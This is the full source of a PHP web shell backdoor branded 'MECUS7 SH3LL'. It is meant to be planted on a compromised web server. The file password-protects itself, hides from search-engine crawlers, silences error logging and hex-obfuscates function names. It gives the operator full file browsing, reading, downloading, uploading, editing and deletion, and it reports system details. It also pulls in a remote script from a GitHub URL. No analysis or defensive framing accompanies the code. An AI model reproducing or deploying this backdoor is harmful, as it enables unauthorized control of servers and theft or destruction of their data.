<?php
session_start();
error_reporting(0);
set_time_limit(0);
@clearstatcache();
@ini_set('error_log',NULL);
@ini_set('log_errors',0);
@ini_set('max_execution_time',0);
@ini_set('output_buffering',0);
@ini_set('display_errors', 0);
$auth_pass = "6463a9fe63b00037d798fa6373ca1b7e";
$color = "#FF6600";
$default_action = 'FilesMan';
$default_use_ajax = true;
$default_charset = 'UTF-8';
if(!empty($_SERVER['HTTP_USER_AGENT'])) {
    $userAgents = array("Googlebot", "Slurp", "MSNBot", "PycURL", "facebookexternalhit", "ia_archiver", "crawler", "Yandex", "Rambler", "Yahoo! Slurp", "YahooSeeker", "bingbot");
    if(preg_match('/' . implode('|', $userAgents) . '/i', $_SERVER['HTTP_USER_AGENT'])) {
        header('HTTP/1.0 404 Not Found');
        exit;
    }
}

function login_shell() {
?>
<!DOCTYPE html>
<html>
	<title>[!] MECUS7 SH3LL [!]</title>
	<head>
		<meta name="viewport" content="widht=device-widht, initial-scale=1.0"/>
		<meta name="author" content="[!] MECUS7 SH3LL [!]"/>
		<meta name="copyright" content="[!] MECUS7 SH3LL [!]"/>
		<link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.0/css/bootstrap.min.css"/>
		<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.1/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous"/>
	</head>
	<body class="bg-dark text-light">
		<center>
			<br/><h3>[!] MECUS7 SH3LL [!] </h3><hr/><br/>
			<div class="container">
				<div class="col-lg-6">
					<div class="form-group">
					<h5>0 b y t 3 m 1 n 1 - 2.2</h5>
<h5>Bypass 403 Forbidden</h5>
<h5>Auto Delete Shell</h5>
<h5>PHP Malware Detector</h5>
<h5>Minishell Backdoor</h5>
<h5>Login And Logout</h5>
<h5>PhpInfo</h5>
					<br/>
						<form method="post">
							<input type="password" name="pass" placeholder="Password" class="form-control"><br/>
							<input type="submit" class="btn btn-danger btn-block" class="form-control" value="Login">

<br>
<h5>© 2021 | Powered By MecUs7</h5>
						</form>
					</div>
				</div><br/>
			</div>
		</center>
	</body>
</html>
<?php
exit;
}
if(!isset($_SESSION[md5($_SERVER['HTTP_HOST'])]))
    if( empty($auth_pass) || ( isset($_POST['pass']) && (md5($_POST['pass']) == $auth_pass) ) )
        $_SESSION[md5($_SERVER['HTTP_HOST'])] = true;
    else
        login_shell();
if(isset($_GET['file']) && ($_GET['file'] != '') && ($_GET['act'] == 'download')) {
    @ob_clean();
    $file = $_GET['file'];
    header('Content-Description: File Transfer');
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="'.basename($file).'"');
    header('Expires: 0');
    header('Cache-Control: must-revalidate');
    header('Pragma: public');
    header('Content-Length: ' . filesize($file));
    readfile($file);
    exit;
}
?>
<?php
/*
    0 b y t 3 m 1 n 1 - 2.2
    Bypass 403 Forbidden / Auto Delete Shell / PHP Malware Detector / Minishell
*/

set_time_limit(0);
error_reporting(0);
error_log(0);

$sname       = "[!]MECUS7 SH3LL" . "[!]";
$__gcdir     = "\x67" . "\x65\x74\x63\x77\x64";
$__fgetcon7s = "\x66\x69\x6c\x65" . "\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73";
$__scdir     = "s" . "\x63\x61\x6e\x64\x69" . "r";
$rm__dir     = "\x72\x6d\x64" . "ir";
$un__link    = "\x75\x6e" . "\x6c\x69\x6e\x6b";

if (get_magic_quotes_gpc()) {
    foreach ($_POST as $key => $value) {
        $_POST[$key] = stripslashes($value);
    }
}
echo '<!DOCTYPE html><html><head><link href="https://fonts.googleapis.com/css?family=VT323" rel="stylesheet"><title>'.$sname.'</title><script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script><link href="//zerobyte-id.github.io/PHP-Backdoor/inc/m1n1.css" rel="stylesheet" type="text/css"></head><body>';
echo '<div style="color:#ef6c00;margin-top:0;"><h1><center>' . $sname . '</center></h1></div>';
if (isset($_GET['path'])) {
    $path = $_GET['path'];
    chdir($_GET['path']);
} else {
    $path = $__gcdir();
}
$path  = str_replace("\\", "/", $path);
$paths = explode("/", $path);
echo '<table width="100%" border="0" align="center" style="margin-top:-10px;"><tr><td>';
echo "<font style='font-size:13px;'>Path: ";
foreach ($paths as $id => $pat) {
    echo "<a style='font-size:13px;' href='?path=";
    for ($i = 0; $i <= $id; $i++) {
        echo $paths[$i];
        if ($i != $id) {
            echo "/";
        }
    }
    echo "'>$pat</a>/";
}
echo '<br></a>
<br><center>[!] <font color=#FF6600>Copyright © 2021 | Powered By MecUs7</font> [!]</a></font></center>
</font></td><td align="center" width="27%"><form enctype="multipart/form-data" method="POST"><input type="file" name="file" style="color:#ef6c00;margin-bottom:4px;"/><input type="submit" value="Upload" /></form></td>
<td colspan="2">';
if (isset($_FILES['file'])) {
    if (copy($_FILES['file']['tmp_name'], $path . '/' . $_FILES['file']['name'])) {
        echo '<center><font color="#00ff00">Upload OK!</font></center><br/>';
    } else {
        echo '<center><font color="red">Upload FAILED!</font></center><br/>';
    }
}
echo '</td></tr><tr><td></table><div class="table-div"></div><input id="image" type="hidden">';
echo '';
if (isset($_GET['filesrc'])) {
    echo '<table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr><td>File: ';
    echo "" . basename($_GET['filesrc']);
    "";
    echo '</tr></td></table><br />';
    echo ("<center><textarea readonly=''>" . htmlspecialchars($__fgetcon7s($_GET['filesrc'])) . "</textarea></center>");
} elseif (isset($_GET['option']) && $_POST['opt'] != 'delete') {
    echo '</table><br /><center>' . $_POST['path'] . '<br /><br />';
    if ($_POST['opt'] == 'rename') {
        if (isset($_POST['newname'])) {
            if (rename($_POST['path'], $path . '/' . $_POST['newname'])) {
                echo '<center><font color="#00ff00">Rename OK!</font></center><br />';
            } else {
                echo '<center><font color="red">Rename Failed!</font></center><br />';
            }
            $_POST['name'] = $_POST['newname'];
        }
        echo '<form method="POST">New Name : <input name="newname" type="text" size="20" value="' . $_POST['name'] . '" /> <input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="rename"><input type="submit" value="Go" /></form>';
    } elseif ($_POST['opt'] == 'edit') {
        if (isset($_POST['src'])) {
            $fp = fopen($_POST['path'], 'w');
            if (fwrite($fp, $_POST['src'])) {
                echo '<center><font color="#00ff00">Edit File OK!.</font></center><br />';
            } else {
                echo '<center><font color="red">Edit File Failed!.</font></center><br />';
            }
            fclose($fp);
        }
        echo '<form method="POST"><textarea cols=80 rows=20 name="src">' . htmlspecialchars($__fgetcon7s($_POST['path'])) . '</textarea><br /><input type="hidden" name="path" value="' . $_POST['path'] . '"><input type="hidden" name="opt" value="edit"><input type="submit" value="Go" /></form>';
    }
    echo '</center>';
} else {
    echo '</table><br /><center>';
    if (isset($_GET['option']) && $_POST['opt'] == 'delete') {
        if ($_POST['type'] == 'dir') {
            if ($rm__dir($_POST['path'])) {
                echo '<center><font color="#00ff00">Dir Deleted!</font></center><br />';
            } else {
                echo '<center><font color="red">Delete Dir Failed!</font></center><br />';
            }
        } elseif ($_POST['type'] == 'file') {
            if ($un__link($_POST['path'])) {
                echo '<font color="#00ff00">Delete File Done.</font><br />';
            } else {
                echo '<font color="red">Delete File Error.</font><br />';
            }
        }
    }
    echo '</center>';
    $_scdir = $__scdir($path);
    echo '<div id="content"><table width="100%" border="0" cellpadding="3" cellspacing="1" align="center"><tr class="first"> <th><center>Name</center></th><th width="12%"><center>Size</center></th><th width="10%"><center>Permissions</center></th> <th width="15%"><center>Last Update</center></th><th width="11%"><center>Options</center></th></tr>';
    foreach ($_scdir as $dir) {
        if (!is_dir("$path/$dir") || $dir == '.' || $dir == '..')
            continue;
        echo "<tr><td>[D] <a href=\"?path=$path/$dir\">$dir</a></td><td><center>--</center></td><td><center>";
        if (is_writable("$path/$dir"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$dir"))
            echo '<font color="red">';
        echo perms("$path/$dir");
        if (is_writable("$path/$dir") || !is_readable("$path/$dir"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$dir")) . "";
        echo "</center></td> <td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option></select><input type=\"hidden\" name=\"type\" value=\"dir\"><input type=\"hidden\" name=\"name\" value=\"$dir\"><input type=\"hidden\" name=\"path\" value=\"$path/$dir\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
    }
    foreach ($_scdir as $file) {
        if (!is_file("$path/$file"))
            continue;
        $size = filesize("$path/$file") / 1024;
        $size = round($size, 3);
        if ($size >= 1024) {
            $size = round($size / 1024, 2) . ' MB';
        } else {
            $size = $size . ' KB';
        }
        echo "<tr><td>[F] <a href=\"?filesrc=$path/$file&path=$path\">$file</a></td><td><center>" . $size . "</center></td><td><center>";
        if (is_writable("$path/$file"))
            echo '<font color="#00ff00">';
        elseif (!is_readable("$path/$file"))
            echo '<font color="red">';
        echo perms("$path/$file");
        if (is_writable("$path/$file") || !is_readable("$path/$file"))
            echo '</font>';
        echo "</center></td><td><center>" . date("d-M-Y H:i", filemtime("$path/$file")) . "";
        echo "</center></td><td><center><form method=\"POST\" action=\"?option&path=$path\"><select name=\"opt\"><option value=\"\"></option><option value=\"delete\">Delete</option><option value=\"rename\">Rename</option><option value=\"edit\">Edit</option></select><input type=\"hidden\" name=\"type\" value=\"file\"><input type=\"hidden\" name=\"name\" value=\"$file\"><input type=\"hidden\" name=\"path\" value=\"$path/$file\"><input type=\"submit\" value=\"+\" /></form></center></td></tr>";
    }
    echo '</table></div>';
}
function perms($file)
{
    $perms = fileperms($file);
    if (($perms & 0xC000) == 0xC000) {
        $info = 's';
    } elseif (($perms & 0xA000) == 0xA000) {
        $info = 'l';
    } elseif (($perms & 0x8000) == 0x8000) {
        $info = '-';
    } elseif (($perms & 0x6000) == 0x6000) {
        $info = 'b';
    } elseif (($perms & 0x4000) == 0x4000) {
        $info = 'd';
    } elseif (($perms & 0x2000) == 0x2000) {
        $info = 'c';
    } elseif (($perms & 0x1000) == 0x1000) {
        $info = 'p';
    } else {
        $info = 'u';
    }
    $info .= (($perms & 0x0100) ? 'r' : '-');
    $info .= (($perms & 0x0080) ? 'w' : '-');
    $info .= (($perms & 0x0040) ? (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
    $info .= (($perms & 0x0020) ? 'r' : '-');
    $info .= (($perms & 0x0010) ? 'w' : '-');
    $info .= (($perms & 0x0008) ? (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
    $info .= (($perms & 0x0004) ? 'r' : '-');
    $info .= (($perms & 0x0002) ? 'w' : '-');
    $info .= (($perms & 0x0001) ? (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
    return $info;
}
echo '<br><center></center><br>';
$ip = gethostbyname($_SERVER['HTTP_HOST']);
$kernel = php_uname();
$ip_web = gethostbyname($_SERVER['HTTP_HOST']);
$ds = @ini_get("disable_functions");
$show_ds = (!empty($ds)) ? "<font color=red>$ds</font>" : "<font color=#FF6600>Bersih</font>";
if(!function_exists('posix_getegid')) {
	$user = @get_current_user();
	$uid = @getmyuid();
	$gid = @getmygid();
	$group = "?";
} else {
	$uid = @posix_getpwuid(posix_geteuid());
	$gid = @posix_getgrgid(posix_getegid());
	$user = $uid['name'];
	$uid = $uid['uid'];
	$group = $gid['name'];
	$gid = $gid['gid'];
}
echo "Disable Functions : $show_ds<br>";
echo "System : <font color=#FF6600>".$kernel."</font><br>";
echo "Ip Address : <font color=#FF6600>".$ip_web."</font><br>";
echo "<center>";
echo "<hr>";
echo '<script type="text/javascript" src="https://raw.githubusercontent.com/mecus7/priv/main/footer.js"></script>';
echo '</body></html><!-- EOF -->';
?>
<center>
</a>
<br>[ <a href="?">Home</a> ]</font></td><td align="center" width="27%">
<a href='?keluar=true' class='list-group-item list-group-item-action bg-light'><i class='fas fa-sign-out-alt'></i> <font color="white">[</font> Logout <font color="white">]</font></a>
<a href='https://fb.me/mecus7=true' class='list-group-item list-group-item-action bg-light'><i class='fas fa-sign-out-alt'></i> <font color="white">[</font> Facebook <font color="white">]</font></a>
</center>        
      </div>
    </div>
      <div class="container-fluid">                
<?php
if($_GET["keluar"] == true){
unset($_SESSION[md5($_SERVER['HTTP_HOST'])]);
	echo "<script>window.location='?';</script>";
}
?>